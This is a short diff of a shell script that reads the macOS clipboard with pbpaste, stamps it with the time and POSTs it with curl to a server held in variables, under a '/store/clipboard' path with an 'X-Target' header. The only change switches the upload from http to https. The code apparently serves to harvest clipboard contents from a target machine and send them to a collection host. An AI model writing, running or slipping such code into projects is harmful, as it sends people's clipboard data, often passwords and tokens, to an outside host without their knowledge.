@@ -6,7 +6,7 @@ OUT="captured : $(date '+%Y-%m-%d %H:%M:%S')
 [CURRENT CLIPBOARD]
 $(pbpaste 2>/dev/null || echo "(empty)")"
 
-echo "$OUT" | curl -s -X POST "http://$H:$P/store/clipboard" \
+echo "$OUT" | curl -s -X POST "https://$H:$P/store/clipboard" \
      -H "Authorization: $AU" \
      -H "Content-Type: text/plain" \
      -H "X-Target: $TH" \
